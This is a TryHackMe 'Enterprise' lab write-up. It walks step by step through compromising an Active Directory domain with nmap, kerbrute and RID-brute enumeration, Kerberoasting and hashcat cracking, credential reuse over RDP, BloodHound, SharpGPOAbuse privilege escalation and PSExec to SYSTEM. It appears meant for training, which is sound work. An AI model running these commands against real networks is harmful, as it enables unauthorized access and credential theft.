# 📝 THM — Enterprise

**Platform:** TryHackMe  
**Room:** Enterprise  
**OS:** Windows — Active Directory  
**Domain:** LAB.ENTERPRISE.THM  
**Attack Path:** SMB Enum → Kerberoasting → Credential Reuse → RDP → GPO Abuse → SYSTEM

---

## Machine Info

| Field | Value |
|-------|-------|
| IP | 10.10.x.x (dynamic) |
| Domain | LAB.ENTERPRISE.THM |
| DC Hostname | LAB-DC |
| Key Techniques | SMB enum, Kerberoasting, GPO abuse, PSExec |

---

## Environment Setup

```bash
export ip=10.10.x.x
export domain=LAB.ENTERPRISE.THM
echo "$ip lab.enterprise.thm LAB-DC" >> /etc/hosts
mkdir -p scan enum creds loot
```

---

## Phase 1 — Recon

```bash
nmap -p- -T4 --min-rate=1000 -oN scan/nmap-full.txt $ip
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,7990 \
  -sV -sC -oN scan/nmap-svc.txt $ip
```

**Key open ports:**

```
53    DNS
88    Kerberos
135   RPC
139/445 SMB
389   LDAP
3389  RDP
7990  Bitbucket / web app
# Domain: LAB.ENTERPRISE.THM
```

---

## Phase 2 — Domain Enumeration

```bash
# Kerbrute username enumeration
sudo ./kerbrute userenum ./usernames -d $domain --dc $ip | tee enum/raw-kerbrute.txt
grep "VALID USERNAME" enum/raw-kerbrute.txt | awk -F'@' '{print $1}' | awk '{print $NF}' \
  > enum/users.txt

# SMB null session
nxc smb $ip -u '' -p '' --shares
smbclient -L //$ip -N

# RID brute
nxc smb $ip -u '' -p '' --rid-brute | tee enum/raw-rid.txt
grep "SidTypeUser" enum/raw-rid.txt | awk -F'\\' '{print $2}' | awk '{print $1}' \
  >> enum/users.txt
```

**Shares discovered:**

```
ADMIN$    → No access
C$        → No access
IPC$      → READ ONLY
Users     → READ ONLY  ← check for interesting files
```

```bash
# Check Users share
smbclient //$ip/Users -N
smb: \> ls
# Browse user directories for interesting files
```

---

## Phase 3 — Kerberoasting

```bash
# With credentials obtained from recon / web app
sudo impacket-GetUserSPNs $domain/$user:$pass -dc-ip $ip \
  -request -outputfile creds/kerb-hashes.txt

# Without creds (if Kerberos-only)
sudo impacket-GetUserSPNs $domain/ -k -no-pass -dc-ip $ip -request

# Crack TGS hash
sudo hashcat -m 13100 creds/kerb-hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 4 — Credential Reuse → RDP

```bash
# Test cracked credentials across services
nxc smb $ip -u $user -p $pass
nxc winrm $ip -u $user -p $pass
nxc rdp $ip -u $user -p $pass

# RDP access
sudo xfreerdp /u:$user /p:$pass /v:$ip +clipboard /cert-ignore
```

---

## Phase 5 — Privilege Escalation → GPO Abuse

```bash
# Enumerate GPOs with BloodHound
sudo nxc ldap $ip -u $user -p $pass --bloodhound --collection All --dns-server $ip

# Import and check:
# "Find Principals with GPO Admin Rights"
# "Shortest Paths to Domain Admins from Owned"
```

**BloodHound finding:** Current user has **GenericWrite** on a GPO that applies to Domain Controllers.

```bash
# PowerView — check GPO permissions
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "Write" }

# Abuse GPO — add current user to local administrators via GPO
# Or use SharpGPOAbuse if available
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author NT_AUTHORITY\SYSTEM \
  --Command "cmd.exe" --Arguments "/c net localgroup administrators $user /add" \
  --GPOName "VULNERABLE_GPO"

# Force GPO update
gpupdate /force
```

---

## Phase 6 — Domain Admin

```bash
# PSExec with elevated access
sudo impacket-psexec $domain/$user:$pass@$ip
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
[ROOT FLAG]
```

---

## Attack Chain Summary

```
nmap → SMB (445), Kerberos (88), RDP (3389) open
  ↓
SMB / kerbrute → user enumeration
  ↓
Kerberoasting → TGS hash → crack → credentials
  ↓
RDP access with cracked creds
  ↓
BloodHound → GenericWrite on GPO
  ↓
SharpGPOAbuse → add to local admin
  ↓
PSExec → SYSTEM
```

---

## Key Takeaways

```
1. Web apps (Bitbucket, port 7990) often contain credentials in repos / commits
2. Kerberoastable service accounts with weak passwords are frequent in real environments
3. GPO misconfiguration (GenericWrite) = lateral movement / privesc path
4. BloodHound makes GPO abuse paths visible — manual enum would miss it
```

---

**MITRE ATT&CK:** T1558.003 (Kerberoasting) · T1484.001 (Group Policy Modification) · T1021.001 (RDP)

[← Back to Writeups](README.md)
